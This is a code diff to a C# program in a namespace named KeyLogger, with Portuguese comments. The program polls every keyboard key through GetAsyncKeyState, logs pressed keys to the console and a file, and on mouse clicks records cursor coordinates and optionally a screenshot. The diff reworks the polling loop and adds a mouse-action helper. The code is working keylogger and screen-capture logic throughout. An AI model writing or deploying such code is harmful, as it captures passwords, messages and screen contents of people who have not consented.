@@ -13,8 +13,8 @@ using System.Drawing.Imaging;
 using System.IO;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Threading;
 using System.Windows.Forms;
-using Timer = System.Threading.Timer;
 
 namespace KeyLogger
 {
@@ -65,18 +65,28 @@ namespace KeyLogger
         private static void Main()
         {
             Console.WriteLine("Press any key to exit.");
-            new Timer(state =>
+            do
             {
-                foreach (var key in (Keys[])Enum.GetValues(typeof(Keys)))
+                foreach (var key in (Keys[]) Enum.GetValues(typeof(Keys)))
                 {
                     if (GetAsyncKeyState(key) != -32767) continue;
                     var keyName = GetKeyName(key, true);
                     Console.Write(keyName);
                     WriteOnFile(keyName);
                 }
-            }, null, TimeSpan.Zero, TimeSpan.FromMilliseconds(10));
-            
-            Console.ReadKey(true);
+
+                Thread.Sleep(10);
+            } while (!Console.KeyAvailable);
+        }
+
+        /// <summary>
+        /// Determina se uma tecla é ação de mouse.
+        /// </summary>
+        /// <param name="keyName">Nome da tecla.</param>
+        /// <returns>Resultado do teste.</returns>
+        private static bool IsMouseAction(string keyName)
+        {
+            return keyName.Contains("Button") || keyName.Contains("Menu");
         }
 
         /// <summary>
@@ -94,19 +104,19 @@ namespace KeyLogger
                 case Keys.Enter: return Environment.NewLine;
                 default:
                 {
-                    var name = $"{Enum.GetName(typeof(Keys), key)}";
+                    var keyName = $"{Enum.GetName(typeof(Keys), key)}";
                     
-                    if (name.Length == 1) return name.ToLower();
+                    if (keyName.Length == 1) return keyName.ToLower();
 
                     // ReSharper disable once InvertIf
-                    if (name.Contains("Button"))
+                    if (IsMouseAction(keyName))
                     {
                         GetCursorPos(out var mouse);
                         var printScreen = printScreenIfMouseAction ? PrintScreen(mouse) : string.Empty;
-                        return $"[{name} X:{mouse.X} Y:{mouse.Y} {printScreen}]".Trim();
+                        return $"[{keyName} X:{mouse.X} Y:{mouse.Y} {printScreen}]".Trim();
                     }
 
-                    return $"[{name}]";
+                    return $"[{keyName}]";
                 }
             }
         }
